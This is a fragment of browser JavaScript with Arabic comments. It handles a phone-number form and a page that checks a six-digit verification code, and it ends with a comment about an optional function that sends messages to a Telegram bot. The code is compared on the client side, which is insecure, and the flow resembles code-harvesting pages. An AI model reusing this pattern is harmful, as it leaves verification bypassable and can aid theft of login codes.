...
document.getElementById('phoneForm').addEventListener('submit', function(event) {
    ...
    window.location.href = 'code_verification.html'; // استبدل بمسار الصفحة الجديدة
});

// التحقق من الكود (في صفحة code_verification.html)
if (window.location.pathname.includes('code_verification.html')) {
    document.getElementById('codeForm').addEventListener('submit', function(event) {
        event.preventDefault();

        const code = document.getElementById('code').value;

        // التحقق من أن الكود يتكون من 6 أرقام
        if (!/^\d{6}$/.test(code)) {
            alert('يرجى إدخال كود مكون من 6 أرقام فقط');
            return;
        }

        // التحقق من تطابق الكود
        if (code === correctCode) {
            alert('الكود صحيح! تم التحقق بنجاح.');
...
// دالة لإرسال الرسائل إلى بوت Telegram (اختياري)
